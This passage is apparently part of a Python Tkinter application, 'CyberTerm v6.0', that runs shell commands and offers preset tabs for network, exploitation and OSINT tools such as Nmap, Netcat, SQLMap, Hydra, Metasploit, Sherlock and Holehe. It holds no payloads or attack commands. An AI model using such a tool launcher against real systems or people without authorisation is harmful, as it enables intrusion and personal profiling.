        self.add_output(f"📁 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n", 'prompt')
        self.add_output(f"$ {cmd}\n", 'prompt')
        self.add_output(f"{'='*60}\n", 'prompt')

        self.stop_requested.clear()

        def target():
            process = None
            try:
                with self.process_lock:
                    if self.stop_requested.is_set():
                        return
                    
                    process = subprocess.Popen(
                        cmd, shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, bufsize=1,
                        preexec_fn=os.setsid
                    )
                    self.current_process = process
                    self.process_running = True
                    self.run_button.config(state=tk.DISABLED)
                    self.stop_button.config(state=tk.NORMAL)

                while process.poll() is None and not self.stop_requested.is_set():
                    try:
                        rlist, _, _ = select.select([process.stdout], [], [], 0.1)
                        if rlist:
                            data = process.stdout.read(4096)
                            if data:
                                self.add_output(data)
                    except:
                        break

                if self.stop_requested.is_set():
                    try:
                        os.killpg(os.getpgid(process.pid), signal.SIGKILL)
                    except:
                        try:
                            process.kill()
                        except:
                            pass
                    process.wait()
                else:
                    returncode = process.wait()
                    self.add_output(f"\n✅ Completed (code: {returncode})\n", 'success')

            except Exception as e:
                if not self.stop_requested.is_set():
                    self.add_output(f"\n❌ Error: {e}\n", 'error')
            finally:
                with self.process_lock:
                    self.current_process = None
                    self.process_running = False
                try:
                    self.user_scrolled = False
                    self.run_button.config(state=tk.NORMAL)
                    self.stop_button.config(state=tk.DISABLED)
                except:
                    pass
                self.stop_requested.clear()

        threading.Thread(target=target, daemon=True).start()

    def clear_output(self):
        try:
            self.output_text.config(state=tk.NORMAL)
            self.output_text.delete(1.0, tk.END)
            self.output_text.config(state=tk.DISABLED)
            self.user_scrolled = False
            self.add_output("✨ Cleared\n", 'success')
        except:
            pass

    def add_output(self, text, tag=None):
        def _add():
            try:
                if not self.output_text.winfo_exists():
                    return
                self.output_text.config(state=tk.NORMAL)
                self.output_text.insert(tk.END, text, tag)
                
                if not self.user_scrolled:
                    self.output_text.see(tk.END)
                    
                self.output_text.config(state=tk.DISABLED)
            except:
                pass

        if threading.current_thread() is threading.main_thread():
            _add()
        else:
            try:
                if self.output_text.winfo_exists():
                    self.output_text.after(0, _add)
            except:
                pass

    def close_tab(self):
        if self.process_running:
            self.stop_current_tool()
        self.output_text.after(50, lambda: self.on_close_callback(self))


class CyberTerminalApp:
    def __init__(self, root):
        self.root = root
        self.root.title("CyberTerm v6.0 - Professional Terminal")
        self.root.geometry("1400x900")
        self.root.minsize(1000, 600)
        self.root.configure(bg='#0C0C0C')

        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TNotebook', background='#0C0C0C', borderwidth=0)
        style.configure('TNotebook.Tab', background='#1A1A1A', foreground='#00FF00', 
                       padding=[15, 8], font=('Arial', 10))
        style.map('TNotebook.Tab', background=[('selected', '#2A2A2A')], 
                 foreground=[('selected', '#44FF44')])

        top_bar = tk.Frame(root, bg='#0C0C0C', height=50)
        top_bar.pack(fill=tk.X, padx=10, pady=(10, 5))
        top_bar.pack_propagate(False)

        logo_frame = tk.Frame(top_bar, bg='#0C0C0C')
        logo_frame.pack(side=tk.LEFT)

        tk.Label(logo_frame, text="🔥", bg='#0C0C0C', fg='#FF4444', 
                font=('Arial', 18)).pack(side=tk.LEFT)
        tk.Label(logo_frame, text=" CyberTerm v6.0", bg='#0C0C0C', fg='#00FF00', 
                font=('Arial', 14, 'bold')).pack(side=tk.LEFT, padx=(5, 0))
        tk.Label(logo_frame, text=" | Professional Terminal", bg='#0C0C0C', 
                fg='#AA44FF', font=('Arial', 10)).pack(side=tk.LEFT)

        button_frame = tk.Frame(top_bar, bg='#0C0C0C')
        button_frame.pack(side=tk.RIGHT)

        self.new_terminal_button = tk.Button(button_frame, text="+ New Terminal", 
                                            command=self.add_terminal_tab,
                                            bg='#1A1A1A', fg='#00FF00', font=('Arial', 10),
                                            relief=tk.FLAT, padx=15, pady=5, cursor="hand2")
        self.new_terminal_button.pack(side=tk.LEFT, padx=5)

        self.new_tool_button = tk.Button(button_frame, text="+ Tool", 
                                        command=self.add_tool_tab_dialog,
                                        bg='#1A1A1A', fg='#44AAFF', font=('Arial', 10),
                                        relief=tk.FLAT, padx=15, pady=5, cursor="hand2")
        self.new_tool_button.pack(side=tk.LEFT, padx=5)

        self.status_bar = tk.Label(root, 
                                  text=f"✅ Ready | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                                  bg='#1A1A1A', fg='#666666', anchor='w', padx=10, 
                                  font=('Arial', 9))
        self.status_bar.pack(fill=tk.X, side=tk.BOTTOM)

        self.notebook = ttk.Notebook(root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.terminal_tabs = []
        self.tool_tabs = []
        self.tab_counter = 1

        self.add_terminal_tab("Shell")
        
        for tool in ["Nmap", "Netcat", "SQLMap", "Hydra", "Metasploit",
                     "theHarvester", "Sherlock", "Whois", "ExifTool", "Photon",
                     "Holehe", "SpiderFoot", "Dmitry", "Metagoofil"]:
            self.add_tool_tab(tool)

        self.notebook.bind('<Button-3>', self.on_tab_right_click)
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        self.update_status_time()

        if self.terminal_tabs:
            self.terminal_tabs[0].focus()

    def on_tab_right_click(self, event):
        try:
            tab_index = self.notebook.index(f"@{event.x},{event.y}")
            if tab_index >= 0:
                tab_text = self.notebook.tab(tab_index, "text")
                menu = tk.Menu(self.root, tearoff=0, bg='#1A1A1A', fg='#00FF00')
                menu.add_command(label=f"Close {tab_text}", 
                               command=lambda: self.close_tab(tab_index))
                menu.post(event.x_root, event.y_root)
        except:
            pass

    def close_tab(self, tab_index):
        if tab_index >= 0:
            try:
                if tab_index < len(self.terminal_tabs):
                    self.terminal_tabs[tab_index].close_tab()
                else:
                    tool_index = tab_index - len(self.terminal_tabs)
                    if tool_index < len(self.tool_tabs):
                        self.tool_tabs[tool_index].close_tab()
            except:
                try:
                    self.notebook.forget(tab_index)
                except:
                    pass

    def update_status_time(self):
        try:
            self.status_bar.config(
                text=f"✅ Ready | Terminals: {len(self.terminal_tabs)} | "
                     f"Tools: {len(self.tool_tabs)} | "
                     f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
        except:
            pass
        self.root.after(1000, self.update_status_time)

    def on_tab_closed(self, tab):
        try:
            for i, t in enumerate(self.terminal_tabs):
                if t == tab:
                    self.notebook.forget(i)
                    self.terminal_tabs.pop(i)
                    break
        except:
            pass

    def on_tool_closed(self, tab):
        try:
            for i, t in enumerate(self.tool_tabs):
                if t == tab:
                    self.notebook.forget(len(self.terminal_tabs) + i)
                    self.tool_tabs.pop(i)
                    break
        except:
            pass

    def add_terminal_tab(self, name=None):
        if not name:
            self.tab_counter += 1
            name = f"Shell{self.tab_counter}"
        tab = TerminalTab(self.notebook, name, self.on_tab_closed, self.status_bar)
        self.terminal_tabs.append(tab)
        return tab

    def add_tool_tab(self, tool_name):
        tab = ToolTab(self.notebook, tool_name, self.on_tool_closed)
        self.tool_tabs.append(tab)
        return tab

    def add_tool_tab_dialog(self):
        dialog = tk.Toplevel(self.root)
        dialog.title("Add Tool")
        dialog.geometry("450x550")
        dialog.configure(bg='#1A1A1A')
        dialog.transient(self.root)
        dialog.grab_set()

        tk.Label(dialog, text="🔧 Select Tool:", bg='#1A1A1A', 
                fg='#00FF00', font=('Arial', 14, 'bold')).pack(pady=20)

        container = tk.Frame(dialog, bg='#1A1A1A')
        container.pack(fill=tk.BOTH, expand=True, padx=20, pady=(0, 10))

        v_scrollbar = ttk.Scrollbar(container, orient=tk.VERTICAL)
        v_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        canvas = tk.Canvas(container, bg='#1A1A1A', highlightthickness=0,
                          yscrollcommand=v_scrollbar.set)
        canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        v_scrollbar.config(command=canvas.yview)

        scrollable_frame = tk.Frame(canvas, bg='#1A1A1A')
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )

        canvas_frame = canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

        def on_canvas_configure(event):
            canvas.itemconfig(canvas_frame, width=event.width)
        
        canvas.bind('<Configure>', on_canvas_configure)

        def on_mousewheel(event):
            canvas.yview_scroll(int(-1*(event.delta/120)), "units")

        canvas.bind_all("<MouseWheel>", on_mousewheel)
        dialog.bind("<Destroy>", lambda e: canvas.unbind_all("<MouseWheel>"))

        categories = {
            "🌐 NETWORK": ["Nmap", "Netcat"],
            "💥 EXPLOITATION": ["SQLMap", "Hydra", "Metasploit"],
            "🔍 OSINT": ["theHarvester", "Sherlock", "Whois", "ExifTool", 
                        "Photon", "Holehe", "SpiderFoot", "Dmitry", "Metagoofil"]
        }

        icons = {
            "Nmap": "📡", "Netcat": "🎧", "SQLMap": "💉", "Hydra": "🐉",
            "Metasploit": "🎯", "theHarvester": "🌐", "Sherlock": "🔍",
            "Whois": "📋", "ExifTool": "📸", "Photon": "🕷",
            "Holehe": "📧", "SpiderFoot": "🕸", "Dmitry": "🗺", "Metagoofil": "📑"
        }

        for category, tools in categories.items():
            cat_frame = tk.Frame(scrollable_frame, bg='#1A1A1A')
            cat_frame.pack(fill=tk.X, pady=(10, 5))

            cat_color = '#AA44FF' if 'OSINT' in category else '#44AAFF'
            tk.Label(cat_frame, text=category, bg='#1A1A1A', 
                    fg=cat_color, font=('Arial', 12, 'bold')).pack(anchor='w')

            separator = tk.Frame(scrollable_frame, bg='#2A2A2A', height=1)
            separator.pack(fill=tk.X, pady=5)

            for tool in tools:
                btn = tk.Button(
                    scrollable_frame,
                    text=f"  {icons.get(tool, '🔧')}  {tool}",
                    command=lambda t=tool: self._add_tool_from_dialog(dialog, t),
                    bg='#2A2A2A', fg='#00FF00', font=('Arial', 10),
                    relief=tk.FLAT, pady=10, padx=15, cursor="hand2",
                    anchor='w', justify='left'
                )
                btn.pack(fill=tk.X, pady=3)

        tk.Button(dialog, text="✗ Cancel", command=dialog.destroy,
                 bg='#3A3A3A', fg='#AAAAAA', font=('Arial', 10),
                 relief=tk.FLAT, pady=8, cursor="hand2").pack(pady=10)

    def _add_tool_from_dialog(self, dialog, tool_name):
        dialog.destroy()
        self.add_tool_tab(tool_name)

    def on_closing(self):
        for tab in self.terminal_tabs + self.tool_tabs:
            if tab.process_running:
                if isinstance(tab, TerminalTab):
                    tab.stop_current_process()
                else:
                    tab.stop_current_tool()

        self.root.after(100, lambda: self._really_close())

    def _really_close(self):
        if messagebox.askokcancel("Exit", "Close CyberTerm v6.0?"):
            self.root.quit()
            self.root.destroy()


def main():
    root = tk.Tk()
    root.withdraw()
    app = CyberTerminalApp(root)
    root.deiconify()
    root.mainloop()


if __name__ == "__main__":
    main()